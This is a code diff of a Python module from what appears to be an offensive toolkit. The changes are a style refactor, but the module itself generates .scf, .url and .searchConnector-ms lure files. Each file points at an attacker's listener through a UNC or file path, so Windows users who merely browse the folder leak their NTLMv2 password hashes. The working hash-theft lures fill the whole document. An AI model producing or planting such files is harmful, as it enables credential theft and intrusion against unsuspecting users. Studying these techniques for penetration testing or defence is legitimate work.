@@ -1,6 +1,5 @@
 """NTLM theft file generation — create files that leak NTLMv2 hashes."""
 
-from __future__ import annotations
 from typing import Any
 
 MANIFEST = {
@@ -36,14 +35,14 @@ def run(args: Any) -> int:
     import os
     print("[*] ntlm_theft not found, generating common files manually")
 
-    scf = "[Shell]\nCommand=2\nIconFile=\\\\{}\\share\\icon.ico\n[Taskbar]\nCommand=ToggleDesktop\n".format(listener)
-    url = "[InternetShortcut]\nURL=file://{}/@loot.html\n".format(listener)
-    lnk_xml = '<?xml version="1.0" encoding="UTF-8"?>\n<searchConnectorDescription>\n<iconReference>\\\\{}\\share\\icon.ico</iconReference>\n</searchConnectorDescription>\n'.format(listener)
+    scf = f"[Shell]\nCommand=2\nIconFile=\\\\{listener}\\share\\icon.ico\n[Taskbar]\nCommand=ToggleDesktop\n"
+    url = f"[InternetShortcut]\nURL=file://{listener}/@loot.html\n"
+    lnk_xml = f'<?xml version="1.0" encoding="UTF-8"?>\n<searchConnectorDescription>\n<iconReference>\\\\{listener}\\share\\icon.ico</iconReference>\n</searchConnectorDescription>\n'
 
     for name, content in [("@loot.scf", scf), ("@loot.url", url), ("@loot.searchConnector-ms", lnk_xml)]:
         path = os.path.join(output, name)
         with open(path, "w") as fh:
             fh.write(content)
-        print("[+] Created: {}".format(path))
+        print(f"[+] Created: {path}")
 
     return 0
